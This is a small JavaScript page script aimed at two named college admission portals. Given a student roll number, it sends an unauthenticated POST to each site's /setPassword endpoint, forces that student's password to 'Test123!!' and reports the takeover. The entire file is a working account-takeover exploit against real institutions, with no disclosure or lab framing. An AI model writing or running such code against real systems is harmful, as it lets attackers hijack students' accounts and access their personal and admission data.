"use strict";

function clg_slc(){
    return document.getElementById('clg').options[document.getElementById('clg').selectedIndex].value;
}

let clg = clg_slc()
document.getElementById('clg').onchange = function() {
clg = clg_slc()

}
document.querySelector('.btn').addEventListener('click',function(){
    let domain
    if(clg==="jb-clg"){
        domain = "jbcollege.curioversity.com";
    }
    else{
        domain = "apply.cottonuniversity.ac.in";
    }
    let url = "https://"+domain+"/setPassword";
    let roll_no = document.querySelector('.roll-no').value;
    fetch(
        url,
        {   method:'POST',
            headers:{ 
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body:"studentId="+roll_no+"&password=Test123!!&confirmPassword=Test123!!"
    })
    
    document.querySelector('.desc').textContent = "Password has been changed for user "+roll_no+" if it exists. The new password is - Test123!!\nThe user belonged to "+domain;

})